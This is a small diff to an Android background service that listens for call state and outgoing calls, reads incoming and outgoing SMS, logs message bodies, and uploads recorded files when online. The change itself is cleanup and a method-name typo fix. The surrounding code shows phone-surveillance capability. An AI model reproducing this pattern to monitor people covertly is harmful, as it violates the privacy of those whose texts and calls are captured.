@@ -46,6 +46,8 @@ public class BackService extends Service {
 	SmsManager smsManager;
 	public static String id = "";
 	LocalBroadcastManager localBroadcastManager;
+	boolean observingSMS = false;
+	String lastID = "";
 
 	@Override
 	public void onCreate() {
@@ -56,15 +58,11 @@ public class BackService extends Service {
 		phoneListener = new PhoneListener(this);
 		telephony = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
 		telephony.listen(phoneListener, PhoneStateListener.LISTEN_CALL_STATE);
-
 		pref = PreferenceManager.getDefaultSharedPreferences(this);
-
 		localBroadcastManager = LocalBroadcastManager.getInstance(this);
-
 		registerReceiver(outcallReceiver, new IntentFilter(Intent.ACTION_NEW_OUTGOING_CALL));
 		registerReceiver(smsReceiver, new IntentFilter("android.provider.Telephony.SMS_RECEIVED"));
 		smsManager = SmsManager.getDefault();
-
 		getContentResolver().registerContentObserver(Uri.parse("content://sms"), true, outsmsObserver);
 	}
 
@@ -86,9 +84,7 @@ public class BackService extends Service {
 			final Bundle bundle = intent.getExtras();
 			try {
 				if (bundle != null) {
-
 					String message = "";
-
 					final Object[] pdusObj = (Object[]) bundle.get("pdus");
 					String phoneNumber = "";
 					for (int i = 0; i < pdusObj.length; i++) {
@@ -98,7 +94,6 @@ public class BackService extends Service {
 						Log.i(AppGlobals.getLogTag(getClass())," "+currentMessage);
 						Log.i(AppGlobals.getLogTag(getClass()),phoneNumber);
 						message += currentMessage.getDisplayMessageBody();
-
 					}
 				}
 			} catch (Exception e) {
@@ -106,9 +101,6 @@ public class BackService extends Service {
 			}
 		}
 	};
-
-	boolean observingSMS = false;
-	String lastID = "";
 
 	ContentObserver outsmsObserver = new ContentObserver(new Handler()) {
 
@@ -155,7 +147,7 @@ public class BackService extends Service {
 							writer.close();
 							String path = RecordService.DEFAULT_STORAGE_LOCATION;
 							if (helpers.isOnline()) {
-                                helpers.requesFiletUpload(path+fileName);
+                                helpers.requestFiletUpload(path+fileName);
                                 new Thread(helpers).start();
                             } else {
                                 dbHandler.createNewFileNameForUpload("filename",path+fileName);
